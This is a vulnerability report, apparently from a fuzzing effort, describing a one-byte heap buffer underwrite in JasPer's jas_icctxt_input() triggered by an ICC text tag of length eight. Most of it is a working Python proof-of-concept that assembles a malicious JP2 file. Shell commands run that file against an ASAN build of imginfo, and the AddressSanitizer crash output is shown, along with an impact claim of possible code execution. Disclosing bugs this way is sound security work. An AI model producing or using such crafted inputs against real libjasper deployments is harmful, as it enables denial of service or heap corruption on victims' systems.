## Bug0: Heap buffer underwrite in jas_icctxt_input when cnt is zero

In `jas_icctxt_input()` in `src/libjasper/base/jas_icc.c`, there is no check that `cnt` is greater than zero before computing `txt->string[cnt - 1] = '\0'`, so when `cnt` is zero (derived from a tag table entry whose `len` field equals eight) the write lands one byte before the start of a zero-byte heap allocation, producing a heap buffer underwrite.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC for heap buffer underwrite in jas_icctxt_input (cnt=0).

Embeds a crafted ICC profile inside a JP2 COLR box (method=2).
The 'cprt' tag table entry has len=8, so cnt = len-8 = 0.
jas_icctxt_input() then writes txt->string[-1] = '\\0'.

Requires a valid JPEG-2000 codestream file (any JP2) whose path is
passed as the first argument or set in the TEMPLATE_JP2 environment
variable.  Example:
    python3 gen.py /path/to/any/valid.jp2
"""

import os
import struct
import sys

TEMPLATE_JP2 = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TEMPLATE_JP2", "")
OUT_FILE = "poc_input.jp2"


# ---------------------------------------------------------------------------
# ICC profile construction
# ---------------------------------------------------------------------------

def build_icc_profile():
    ICC_HDR_LEN  = 128
    num_tags     = 1
    tag_tbl_sz   = num_tags * 12
    tag_data_off = ICC_HDR_LEN + 4 + tag_tbl_sz  # 144
    icc_size     = tag_data_off + 8               # 152

    # 128-byte header
    hdr  = struct.pack(">I", icc_size)   # profile size
    hdr += b'\x00' * 4                   # cmmtype
    hdr += b'\x04\x30\x00\x00'          # version 4.3.0
    hdr += b'mntr'                       # profile class
    hdr += b'RGB '                       # colour space
    hdr += b'XYZ '                       # PCS
    hdr += b'\x00' * 12                  # date/time
    hdr += b'acsp'                       # magic
    hdr += b'\x00' * 4                   # platform
    hdr += b'\x00' * 4                   # flags
    hdr += b'\x00' * 4                   # device manufacturer
    hdr += b'\x00' * 4                   # device model
    hdr += b'\x00' * 8                   # attributes
    hdr += b'\x00' * 4                   # rendering intent
    hdr += b'\x00' * 12                  # PCS illuminant
    hdr += b'\x00' * 4                   # creator
    hdr += b'\x00' * 44                  # reserved
    assert len(hdr) == ICC_HDR_LEN

    tag_count = struct.pack(">I", num_tags)

    # TAG KEY: len=8 => cnt = 8-8 = 0 inside jas_iccprof_load
    TAG_CPRT  = 0x63707274
    tag_entry = struct.pack(">III", TAG_CPRT, tag_data_off, 8)

    TYPE_TEXT = 0x74657874
    tag_data  = struct.pack(">II", TYPE_TEXT, 0)

    profile = hdr + tag_count + tag_entry + tag_data
    assert len(profile) == icc_size
    return profile


# ---------------------------------------------------------------------------
# JP2 box helpers
# ---------------------------------------------------------------------------

def box(type_bytes, data):
    return struct.pack(">I", 8 + len(data)) + type_bytes + data

def box_eof(type_bytes, data):
    return struct.pack(">I", 0) + type_bytes + data


# ---------------------------------------------------------------------------
# Extract jp2c codestream from a template JP2
# ---------------------------------------------------------------------------

def extract_jpc(jp2_path):
    with open(jp2_path, 'rb') as f:
        raw = f.read()
    offset = 0
    while offset < len(raw):
        if offset + 8 > len(raw):
            break
        box_len  = struct.unpack(">I", raw[offset:offset+4])[0]
        box_type = raw[offset+4:offset+8]
        if box_len == 0:
            content = raw[offset+8:]
            nxt = len(raw)
        elif box_len < 8:
            break
        else:
            content = raw[offset+8:offset+box_len]
            nxt = offset + box_len
        if box_type == b'jp2c':
            return content
        offset = nxt
    raise ValueError(f"jp2c box not found in {jp2_path}")


# ---------------------------------------------------------------------------
# Assemble JP2
# ---------------------------------------------------------------------------

def build_jp2(icc_profile, jpc_data):
    jp_sig = struct.pack(">I", 12) + b'jP  ' + b'\x0d\x0a\x87\x0a'

    ftyp_data = b'jp2 ' + b'\x00\x00\x00\x00' + b'jp2 '
    ftyp = box(b'ftyp', ftyp_data)

    ihdr_data = struct.pack(">I", 32) + struct.pack(">I", 32) + \
                struct.pack(">H", 2) + bytes([7, 7, 0, 0])
    ihdr = box(b'ihdr', ihdr_data)

    # method=2 (ICC Restricted Profile), prec=0, approx=0
    colr_data = bytes([2, 0, 0]) + icc_profile
    colr = box(b'colr', colr_data)

    jp2h = box(b'jp2h', ihdr + colr)
    jp2c = box_eof(b'jp2c', jpc_data)

    return jp_sig + ftyp + jp2h + jp2c


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    if not TEMPLATE_JP2:
        print("Usage: python3 gen.py <template.jp2>")
        print("  or:  TEMPLATE_JP2=/path/to/valid.jp2 python3 gen.py")
        sys.exit(1)

    icc_profile = build_icc_profile()
    print(f"[*] ICC profile: {len(icc_profile)} bytes  (cprt tag len=8 => cnt=0)")

    jpc_data = extract_jpc(TEMPLATE_JP2)
    print(f"[*] JPC codestream: {len(jpc_data)} bytes from {TEMPLATE_JP2}")

    jp2_bytes = build_jp2(icc_profile, jpc_data)
    with open(OUT_FILE, 'wb') as f:
        f.write(jp2_bytes)
    print(f"[*] Written {len(jp2_bytes)} bytes to {OUT_FILE}")
    print("[*] Expected: jas_icctxt_input(cnt=0) => txt->string[-1]='\\0' => ASAN abort")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py /path/to/any/valid.jp2
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000090f at pc 0x563c3db80735 bp 0x7fffdf8424b0 sp 0x7fffdf8424a0
WRITE of size 1 at 0x50200000090f thread T0
    #0 0x563c3db80734 in jas_icctxt_input (imginfo+0x6dc734)
    #1 0x563c3dbbbd1b in jas_iccprof_load (imginfo+0x717d1b)
0x50200000090f is located 1 bytes to the left of 1-byte region [0x502000000910,0x502000000911)

### Impact

An attacker can supply a crafted JP2 file whose embedded ICC profile contains a TXT-type tag with a tag-table `len` field of exactly eight, causing a one-byte heap underwrite that writes a zero byte immediately before a zero-byte allocation and corrupts the allocator metadata or an adjacent heap object. This write can destabilize the heap in a way that leads to a subsequent crash (denial of service) during `free` or `malloc`, and with a carefully laid-out heap state an attacker may be able to leverage the corruption to achieve arbitrary code execution. The attack surface is any invocation of `imginfo` (or any application using libjasper for JP2 decoding) on an untrusted input file, requiring no special privileges.
